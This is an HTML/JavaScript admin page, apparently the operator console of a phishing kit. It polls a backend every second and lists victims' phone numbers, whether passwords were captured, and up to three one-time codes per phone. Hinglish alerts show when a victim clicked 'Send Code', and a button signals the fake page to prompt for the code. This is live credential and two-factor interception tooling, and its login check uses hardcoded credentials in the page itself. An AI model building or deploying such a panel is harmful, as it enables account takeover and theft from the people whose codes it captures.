<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Dashboard</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0b1120;
      color: #f8fafc;
      margin: 0;
      padding: 20px;
    }
    .login-box {
      max-width: 360px;
      margin: 80px auto;
      background: #1e293b;
      padding: 24px;
      border-radius: 12px;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin-bottom: 12px;
      border-radius: 8px;
      border: 1px solid #334155;
      background: #0f172a;
      color: #fff;
      box-sizing: border-box;
    }
    .login-box button {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 8px;
      background: #2563eb;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
    }
    .hidden { display: none; }
    .user-card {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 12px;
      padding: 16px;
      margin-bottom: 14px;
    }
    .live-phone {
      font-size: 22px;
      font-weight: bold;
      color: #4ade80;
      letter-spacing: 1px;
    }
    .alert-badge {
      display: inline-block;
      background: #f59e0b;
      color: #000;
      font-weight: bold;
      padding: 4px 10px;
      border-radius: 999px;
      font-size: 13px;
      margin-top: 8px;
    }
    .thumbs-btn {
      font-size: 22px;
      padding: 6px 14px;
      border-radius: 8px;
      border: none;
      background: #16a34a;
      color: #fff;
      cursor: pointer;
      margin-left: 8px;
    }
    .del-btn {
      padding: 6px 12px;
      border-radius: 8px;
      border: none;
      background: #dc2626;
      color: #fff;
      cursor: pointer;
      margin-left: 8px;
    }
    .code-boxes {
      display: flex;
      gap: 10px;
      margin-top: 12px;
    }
    .code-box {
      background: #0f172a;
      border: 1px solid #475569;
      padding: 10px 14px;
      border-radius: 8px;
      min-width: 72px;
      text-align: center;
      font-size: 16px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div id="loginSection" class="login-box">
    <h2>Admin Login</h2>
    <input type="email" id="emailInput" placeholder="Email" />
    <input type="password" id="passwordInput" placeholder="Password" />
    <button id="loginBtn">Login</button>
    <p id="loginError" style="color:#f87171;"></p>
  </div>

  <div id="dashboardSection" class="hidden">
    <h2>Live User Monitor (1s Auto-Refresh)</h2>
    <div id="usersContainer"></div>
  </div>

  <script>
    const ADMIN_EMAIL = 'admin@example.com';
    const ADMIN_PASSWORD = 'admin123';

    const loginSection = document.getElementById('loginSection');
    const dashboardSection = document.getElementById('dashboardSection');
    const loginBtn = document.getElementById('loginBtn');
    const loginError = document.getElementById('loginError');
    const usersContainer = document.getElementById('usersContainer');

    let isLoggedIn = false;

    loginBtn.addEventListener('click', () => {
      const email = document.getElementById('emailInput').value.trim();
      const pass = document.getElementById('passwordInput').value;
      if (email === ADMIN_EMAIL && pass === ADMIN_PASSWORD) {
        isLoggedIn = true;
        loginSection.classList.add('hidden');
        dashboardSection.classList.remove('hidden');
        fetchLiveData();
      } else {
        loginError.textContent = 'Invalid email or password';
      }
    });

    window.sendThumbsUp = async function(sessionId) {
      await fetch('/api/admin/mark-code-sended', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId })
      });
      fetchLiveData();
    };

    window.deleteSession = async function(sessionId) {
      await fetch(`/api/sessions/${encodeURIComponent(sessionId)}`, {
        method: 'DELETE'
      });
      fetchLiveData();
    };

    async function fetchLiveData() {
      if (!isLoggedIn) return;
      try {
        const res = await fetch('/api/submissions');
        const data = await res.json();
        renderUsers(data.sessions || [], data.groupedCodes || {});
      } catch (e) {}
    }

    function renderUsers(sessions, groupedCodes) {
      if (!sessions.length) {
        usersContainer.innerHTML = '<p>Abhi koi live user data nahi hai.</p>';
        return;
      }

      usersContainer.innerHTML = sessions.map(s => {
        const codes = groupedCodes[s.phone] || [null, null, null];
        const boxesHtml = [0, 1, 2].map(idx => {
          const val = codes[idx] || '-';
          return `<div class="code-box" title="Attempt ${idx + 1}">${val}</div>`;
        }).join('');

        return `
          <div class="user-card">
            <div>Live Phone: <span class="live-phone">${s.phone || '-'}</span></div>
            <div>Password: <span>${s.password ? '••••••' : '-'}</span></div>
            ${
              s.codeRequested
                ? `<div class="alert-badge">🔔 User ne "Send Code" click kiya hai!</div>
                   <button class="thumbs-btn" title="Mark code sended" onclick="sendThumbsUp('${s.sessionId}')">👍</button>`
                : s.codeSended
                  ? `<div style="color:#38bdf8; margin-top:8px;">✔ "code sended" bhej diya gaya</div>`
                  : ''
            }
            <button class="del-btn" onclick="deleteSession('${s.sessionId}')">Delete</button>
            <div class="code-boxes">${boxesHtml}</div>
          </div>
        `;
      }).join('');
    }

    setInterval(fetchLiveData, 1000);
  </script>
</body>
</html>
